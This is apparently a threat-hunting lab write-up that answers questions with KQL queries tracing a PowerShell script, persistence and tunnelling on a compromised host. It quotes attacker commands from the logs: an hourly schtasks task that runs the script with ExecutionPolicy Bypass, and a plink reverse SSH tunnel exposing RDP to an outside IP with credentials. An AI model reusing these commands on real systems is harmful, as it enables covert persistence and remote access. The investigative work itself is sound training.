Just prior to the path column is a sha256 column: 60b854332e393a6a2f0015383969c3ac705126a6b7829b762057a3994967a61f

What is the name of the file (.ps1) that was written to disk immediately after the docx was downloaded?
Let's adjust our query ever so slightly:
FileCreationEvents
| where hostname contains "UL0M-MACHINE"
| where filename contains ".ps1"
Answer: hacktivist_manifesto.ps1

When was this new file created?
"timestamp": 2024-01-05T10:24:32.000Z

What type of file is this (.ps1)?
This requires a bit of research. From this reputable source (https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_scripts?view=powershell-7.6) we find:  PowerShell scripts have a .ps1 file extension.

We are then given a screenshot of the script. What does the attacker say to "let you know they are here"?
This comes straight from their image: lol ur bout 2 get pwnd...

According to the PowerShell script, what might be the hacker's favorite color?
Also from the image: green (because "green is a hackr color")

The purpose of the script is to invoke ____ and uncover da truth
Answer: Plink. Again, just look right at the image provided.

The next question points us towards the ProcessEvents table, and asks how many Process Events are related to this PowerShell script on Sonia's machine?
First, let's do this to see the columns we are working with:
ProcessEvents
| take 10
Then, I crafted this based on those columns:
ProcessEvents
| where hostname contains "UL0M"
| where process_commandline contains ".ps1"
Answer: 3

What is the full command used to create the scheduled task? (It points us towards commands containing schtasks.exe, which creates scheduled tasks.)
Answer: schtasks /create /sc hourly /mo 5 /tn "Hacktivist Manifesto" /tr "powershell.exe -ExecutionPolicy Bypass -File C:\ProgramData\hacktivist_manifesto.ps1"

What ExecutionPolicy is set in the command?
As we see above, it shows "-ExecutionPolicy Bypass", so the answer is Bypass.

Next, we are instructed to check ProcessEvents for evidence of plink.exe being executed on Sonia's machine. What IP address is used when plink is executed?
For this, we adjust the query to read "plink" i place os ".ps1". Our results show a process_commandline of: plink.exe -R 3389:localhost:3389 -ssh -l $had0w -pw thruthW!llS3tUfree 136.130.190.181

What username did the attacker use when connecting via plink?
The -l portion of the previous command shows us the username being used: $had0w
(Source: https://man7.org/linux/man-pages/man1/ssh.1.html)

What password did the attacker use when connecting via plink?
Same referenced line as 2 above: thruthW!llS3tUfree

What six-letter command did the attackers run to figure out which user they are logged on as on the computer?
This takes us back to our query that we must edit.
ProcessEvents
| where hostname contains "UL0M"
| where timestamp between (datetime(2024-01-06T02:39:35.000Z) .. datetime(2024-01-31T02:39:35.000Z))
The top 2 lines are the same. Where it changes is the 3rd line: we are now looking for activity between the timestamp of when the plink command was run (Jan 6) and an arbritrary time I picked: Jan 31.
The very next command after the plink command is "whoami".

How many discovery commands did the attackers run on this machine?
We have: whoami, ipconfig, arp -a, tasklist /svc, and net view (before other commands are run). That makes 5.

Now, we've hit a dead end. No other suspicious activity on this particular machine.
Do you think we can safely stop our investigation here? (yes/no)
Of course not! We haven't solved the entire puzzle yet!


